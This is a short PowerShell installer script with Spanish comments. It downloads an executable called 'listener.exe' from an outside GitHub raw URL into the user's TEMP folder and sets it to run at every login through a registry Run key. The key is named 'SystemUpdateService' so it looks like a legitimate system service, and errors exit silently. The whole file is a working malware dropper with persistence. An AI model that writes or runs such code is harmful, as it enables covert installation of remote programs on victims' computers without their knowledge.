# installer.ps1
# Objetivo: Descargar x.exe y establecer persistencia vía Registro (HKCU Run)

$targetPath = "$env:TEMP\x.exe"
$downloadUrl = "https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/execs/listener.exe"
# IMPORTANTE: Cambia la URL arriba si necesitas descargar un archivo real diferente.
# Si example.com/x.exe no existe, la descarga fallará silenciosamente o dará error.

# La ruta del registro DEBE tener el prefixo 'Registry::' para funcionar
$regPath = "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SystemUpdateService"

# 1. Descargar el archivo
try {
    # Usamos Invoke-WebRequest. Si la URL no es válida o el archivo no existe, esto fallará.
    Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath -UseBasicParsing
}
catch {
    # Error silencioso o salida. En una demo real, podrías querer logear esto.
    exit 1
}

# 2. Establecer persistencia vía Registro
try {
    # Asegurarse de que la ruta existe (aunque HKCU\...\Run suele existir por defecto)
    if (!(Test-Path $regPath)) {
        New-Item -Path $regPath -Force
    }

    # Crear la entrada en el registro
    New-ItemProperty -Path $regPath -Name $regName -Value $targetPath -PropertyType STRING -Force
}
catch {
    # Si falla, salimos.
    exit 1
}

exit 0
